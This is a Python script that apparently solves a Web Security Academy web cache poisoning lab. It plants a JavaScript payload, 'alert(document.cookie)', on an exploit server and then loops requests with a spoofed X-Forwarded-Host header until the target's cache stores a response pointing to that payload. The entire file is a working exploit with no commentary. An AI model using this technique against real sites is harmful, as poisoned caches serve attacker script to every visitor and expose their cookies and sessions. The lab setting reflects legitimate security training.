import requests, time
from urllib.parse import parse_qsl, urljoin, urlparse
from bs4 import BeautifulSoup

site = 'acf01f9d1ed52cc7c0b227e4003f00e8.web-security-academy.net'

# OdinId = 'elafleur'
s = requests.Session()
site_url = f'https://{site}'
# headers = {
#    'X-Forwarded-Host' : f'{OdinId}.net'
# }
# resp = s.get(site_url, headers=headers)
# if resp.headers['X-Cache'] == 'miss':
#     soup = BeautifulSoup(resp.text,'html.parser')
#     script_src = soup.find('script')
#     print(f'Poisoned script tag is {script_src}')

resp = s.get(site_url)
soup = BeautifulSoup(resp.text,'html.parser')
exploit_url = soup.find('a', {'id':'exploit-link'}).get('href')
exploit_site = urlparse(exploit_url).hostname
exploit_html = 'alert(document.cookie)'

formData = {
   'urlIsHttps': 'on',
   'responseFile': '/resources/js/tracking.js',
   'responseHead': '/ HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
   'responseBody': exploit_html,
   'formAction': 'STORE'
}
resp = s.post(exploit_url, data=formData)

headers = {
   'X-Forwarded-Host' : exploit_site
}
while True:
 resp = s.get(site_url, headers=headers)
 if resp.headers['X-Cache'] == 'miss':
       print(f'Poisoned (miss): {resp.headers}')
       break
 timeleft = 30 - int(resp.headers['Age'])
 print(f'Waiting {timeleft} to expire cache')
 time.sleep(timeleft)